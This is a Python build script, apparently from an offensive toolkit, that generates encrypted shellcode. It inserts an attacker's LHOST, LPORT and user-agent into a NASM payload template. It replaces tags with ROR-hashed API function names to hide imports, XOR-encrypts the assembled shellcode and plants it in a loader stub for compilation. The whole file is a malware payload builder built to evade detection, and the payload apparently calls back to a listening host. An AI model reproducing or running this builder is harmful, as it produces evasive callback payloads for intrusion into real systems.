from configparser import ConfigParser
from scripts.ROR import hash
from scripts.utils import *
import random

config = ConfigParser()
config.read(".conf") 

ROR_VALUE = config.getint("Payload", "ror_value")
ENCRYPTION_BYTE = config.get("Payload", "encryption_byte")
PAYLOAD_FILE = config.get("Payload", "filename")

MODE = config.get("Payload","mode")
LHOST = config.get("Payload", "lhost")
LPORT = config.getint("Payload", "lport")
USER_AGENT = config.get("Payload","user_agent")

STUB_FILE = config.get("Loader", "filename")

WORKING_FOLDER = "temp/"


def main():
    print("===========CONFIG==========")
    print(f"ROR value: {ROR_VALUE}")
    print(f"Encryption byte: {ENCRYPTION_BYTE}")
    print("===========================\n")

    print("===========PAYLOAD==============")
    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
    
    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST)
    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT)

    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
    remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_FILE)

    # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
    for tag in remaining_tags:
        parts = tag.replace("%", "").split("__")
        if parts[0] == "HASH":
            sed_file(WORKING_FOLDER+PAYLOAD_FILE, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
        if parts[0] == "RANDOM":
            # Générer une valeur aléatoire de 32 bits
            dword_value = random.randint(0, 0xFFFFFFF)
            sed_file(WORKING_FOLDER+PAYLOAD_FILE, tag, hex(dword_value))
        if parts[0] == "STRING":
            pass #todo


    instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
    nb_bytes = int(len(instructions)/2)
    print(f"Shellcode length: {nb_bytes} bytes")
    print("================================\n")

    # Encrypt the shellcode
    if ENCRYPTION_BYTE != "":
        print("===========ENCRYPTION==============")
        print(instructions)
        print(f"\nEncrypted with '{ENCRYPTION_BYTE}'\n")
        encrypted_instructions = xor_encrypt_decrypt(instructions, int(ENCRYPTION_BYTE, 16))
        print(encrypted_instructions)
        print("===================================\n")
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
        sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", ENCRYPTION_BYTE)
    else:
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(instructions))
        sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", "")

    

    print("\n================COMPILATION===============")


if __name__ == "__main__":
    main()